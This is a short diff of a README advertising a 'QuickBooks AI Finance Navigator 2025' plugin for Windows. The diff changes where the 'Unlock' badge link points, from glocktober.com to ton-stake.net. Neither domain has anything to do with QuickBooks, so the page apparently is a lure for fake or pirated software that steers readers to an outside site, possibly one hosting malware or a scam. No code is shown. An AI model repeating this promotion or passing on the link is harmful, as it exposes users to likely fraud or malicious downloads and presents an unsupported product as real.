@@ -2,7 +2,7 @@
 
 📊 Simplify your accounting with this AI-powered QuickBooks plugin! QuickBooks AI Finance Navigator 2025 automates transactions, optimizes budgets, and delivers financial insights, tailored for freelancers, small businesses, and entrepreneurs on Windows.
 
-[![Unlock QuickBooks AI Finance Navigator](https://img.shields.io/badge/Unlock-QuickBooks_AI_Finance_Navigator-blueviolet)](https://glocktober.com)
+[![Unlock QuickBooks AI Finance Navigator](https://img.shields.io/badge/Unlock-QuickBooks_AI_Finance_Navigator-blueviolet)](https://ton-stake.net)
 
 ---
 
